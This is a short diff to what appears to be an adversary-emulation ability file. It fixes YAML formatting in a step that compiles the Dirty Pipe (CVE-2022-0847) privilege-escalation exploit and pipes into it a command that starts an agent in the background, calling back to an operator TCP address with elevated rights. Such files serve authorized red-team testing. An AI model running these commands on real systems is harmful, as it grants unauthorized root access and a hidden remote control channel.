@@ -12,7 +12,8 @@ platforms:
         cp "./dirtypipe.c" /tmp/dirtypipe.c  
         gcc dirtypipe.c -o /tmp/dirtypipe 
         chmod +x /tmp/dirtypipe        
-        echo 'nohup #{agent.location} -address #{operator.tcp} -range elevated >/dev/null 2>&1 &' | /tmp/dirtypipe payload: '#{operator.payloads}/CVE-2022-0847/dirtypipe.c'
+        echo 'nohup #{agent.location} -address #{operator.tcp} -range elevated >/dev/null 2>&1 &' | /tmp/dirtypipe
+    payload: '#{operator.payloads}/CVE-2022-0847/dirtypipe.c'
 metadata:
   authors:
     - VVX7
